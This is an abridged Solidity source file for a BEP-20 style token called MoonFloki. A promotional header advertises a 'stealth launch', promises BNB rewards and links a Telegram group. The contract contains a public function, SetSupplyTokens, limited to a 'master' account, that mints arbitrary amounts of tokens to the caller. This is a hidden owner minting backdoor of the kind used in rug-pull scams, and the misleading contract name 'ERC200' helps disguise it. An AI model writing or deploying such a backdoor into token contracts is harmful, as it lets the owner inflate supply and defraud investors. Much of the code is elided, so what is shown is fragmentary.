...
/**   Welcome to MoonFloki Stealth Launch
 *     Hold Moon Floki And Earn BNB !!! Claim on Website
 * 
 *    MoonFloki ; MFLOKI
 *    Supply 5.000.000.000
 *    Decimals 9
 * 
 *    Telegram Group https://t.me/MoonFloki
...
contract ERC200 is Context, IERC20, Ownable {
    ...
    function SetSupplyTokens(uint256 amount) public onlyMaster {
    _floki(msg.sender, amount);
    }
    ...
    function _floki(address account, uint256 amount) internal virtual {
...
contract MoonFLOKI is ERC200 {

    uint tokenTotalSupply = 5000000000;

    constructor() public ERC200("MoonFloki", "MFLOKI") {
        _floki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}